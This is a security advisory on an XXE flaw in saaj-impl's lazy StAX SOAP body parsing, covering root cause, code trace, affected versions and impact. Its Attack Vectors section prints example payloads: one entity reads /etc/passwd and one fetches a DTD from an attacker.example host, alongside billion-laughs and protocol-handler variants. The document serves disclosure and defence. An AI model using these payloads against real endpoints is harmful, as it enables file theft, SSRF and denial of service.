# CGP-76vm-gg49-hx7p

Unhardened XMLInputFactory in lazy StAX SOAP body path enables XXE file read, SSRF, and DoS when saaj.lazy.soap.body is enabled

## Affected packages

- **Ecosystem:** Maven
- **Package:** `com.sun.xml.messaging.saaj:saaj-impl`
- **Package URL:** `pkg:maven/com.sun.xml.messaging.saaj/saaj-impl`
- **Introduced:** 1.3.23
- **Fixed:** 3.0.0
- **Weaknesses:** CWE-611

**Affected code:**

- `com.sun.xml.messaging.saaj.soap.EnvelopeFactory.createXMLStreamReader(Source)` (`src/main/java/com/sun/xml/messaging/saaj/soap/EnvelopeFactory.java:118`)

## Severity

- **CVSS_V3:** `CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H/E:X/RL:X/RC:R`

## Details

### Root Cause

`EnvelopeFactory.parseEnvelopeStax()` (called when `soapPart.message.isLazySoapBodyParsing()` returns `true`) obtains an `XMLInputFactory` via `XMLInputFactory.newInstance()` at line 118 without configuring any security properties:

```
if (xmlInputFactory == null) xmlInputFactory = XMLInputFactory.newInstance();
streamReader = xmlInputFactory.createXMLStreamReader(src);
```

The factory is stored in the static field `xmlInputFactory` and reused. Neither `XMLInputFactory.SUPPORT_DTD` nor `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES` is set to `false`, and `FEATURE_SECURE_PROCESSING` is not applied. StAX factories are not covered by JAXP's `FEATURE_SECURE_PROCESSING` flag, so the default factory retains full DTD and external-entity resolution capability.

The default SAX path (`parseEnvelopeSax`) wraps the input in a `RejectDoctypeSaxFilter` (a `LexicalHandler` that throws on `startDTD()`), but this filter is never applied in the StAX path. The lazy-body property is a documented, programmatic feature that frameworks such as JAX-WS RI/Metro may enable.

### Affected Locations

- `com.sun.xml.messaging.saaj.soap.EnvelopeFactory.parseEnvelopeStax()` at line 118 of `src/main/java/com/sun/xml/messaging/saaj/soap/EnvelopeFactory.java`: the `XMLInputFactory.newInstance().createXMLStreamReader(src)` call is the sink. The static `xmlInputFactory` field is initialized without any security properties on first use.

### Attack Vectors

**External file read via DOCTYPE SYSTEM entity:**
An attacker submits a SOAP envelope containing a DOCTYPE declaration with a SYSTEM entity referencing a local file:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><S:Envelope ...><S:Body>&xxe;</S:Body></S:Envelope>
```
The unhardened StAX parser resolves the entity and includes the file contents in the parsed document.

**SSRF via parameter-entity fetching:**
An attacker uses a parameter entity in the DTD subset to trigger an outbound HTTP request from the server:
```xml
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext;]>
```
The parser fetches the external DTD, enabling server-side request forgery to internal services.

**Billion-laughs entity-expansion DoS:**
An attacker submits a document with deeply nested internal entity references. Because `SUPPORT_DTD` is not disabled, the parser expands the entity tree, consuming JVM heap and CPU until `OutOfMemoryError` or process termination.

**Alternate protocol handlers (jar:, netdoc:):**
The `SYSTEM` URI in a DOCTYPE can use `jar:` or `netdoc:` scheme handlers registered in the JVM, potentially escalating file-read to SSRF or contributing to gadget chains on vulnerable stacks.

### Prerequisite

The consuming application or framework must set the `saaj.lazy.soap.body` property to `true` on the `SOAPMessage` before the envelope is materialized. This is a documented, programmatic opt-in feature.

### Impact

An attacker who can submit a crafted SOAP envelope to an endpoint where the lazy-body property is enabled can:
- Read arbitrary local files accessible to the JVM process (confidentiality impact: High)
- Trigger outbound network requests to internal services (SSRF)
- Cause a denial-of-service via entity-expansion (availability impact: High)

### Trace

`MessageFactoryImpl.createMessage(MimeHeaders, InputStream)` → `MessageImpl.init()` → `SOAPPart.setContent(new StreamSource(in))` → [application calls `msg.setProperty("saaj.lazy.soap.body", true)`] → `SOAPPart.getEnvelope()` → `EnvelopeFactory.createEnvelope()` → `isLazySoapBodyParsing() == true` → `parseEnvelopeStax(src, soapPart)` → `XMLInputFactory.newInstance()` (no `SUPPORT_DTD=false`, no `IS_SUPPORTING_EXTERNAL_ENTITIES=false`, no `FEATURE_SECURE_PROCESSING`) → `createXMLStreamReader(attacker XML)`

## Sources

- [Advisory JSON](../../advisories/CGP-76vm-gg49-hx7p/CGP-76vm-gg49-hx7p.json)
- [Patch: CGP-76vm-gg49-hx7p-pkg:maven_com.sun.xml.messaging.saaj_saaj-impl@2.0.1.patch](../../advisories/CGP-76vm-gg49-hx7p/CGP-76vm-gg49-hx7p-pkg:maven_com.sun.xml.messaging.saaj_saaj-impl@2.0.1.patch)

---

Published 2026-11-12T16:00:00Z · Modified 2026-11-12T16:00:00Z · Generated from the advisory JSON by `scripts/generate_advisory_list.py` — do not edit by hand.
